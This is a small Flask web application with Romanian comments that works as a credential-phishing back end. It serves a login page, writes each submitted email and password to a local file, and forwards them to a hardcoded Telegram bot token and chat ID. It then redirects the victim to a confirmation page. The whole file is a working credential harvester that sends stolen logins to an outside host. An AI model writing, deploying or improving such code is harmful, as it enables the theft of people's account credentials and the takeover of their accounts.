from flask import Flask, request, render_template, redirect
import requests
import os

app = Flask(__name__)

# ---------------- TELEGRAM ---------------- #

BOT_TOKEN = "8366831885:AAGfZsn87eCTgMLNDJ19q9oGg-kuMyFtEnA"
CHAT_ID = "5937157896"

def trimite_telegram(email, password):
    mesaj = f"🔐 LOGIN NOU\nEmail: {email}\nParola: {password}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    try:
        requests.post(url, data={
            "chat_id": CHAT_ID,
            "text": mesaj
        })
    except Exception as e:
        print("Eroare Telegram:", e)


# ---------------- RUTE ---------------- #

@app.route("/")
def home():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email")
    password = request.form.get("password")

    # Salvează local - protejat ca să nu dea eroare pe Render
    try:
        with open("logins.txt", "a") as f:
            f.write(f"{email} , {password}\n")
    except:
        pass

    # Trimite pe Telegram
    trimite_telegram(email, password)

    # Redirect către confirmare
    return redirect("/confirmare")


@app.route("/confirmare")
def confirmare():
    return render_template("confirmare.html")


# ---------------- RUN ---------------- #

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
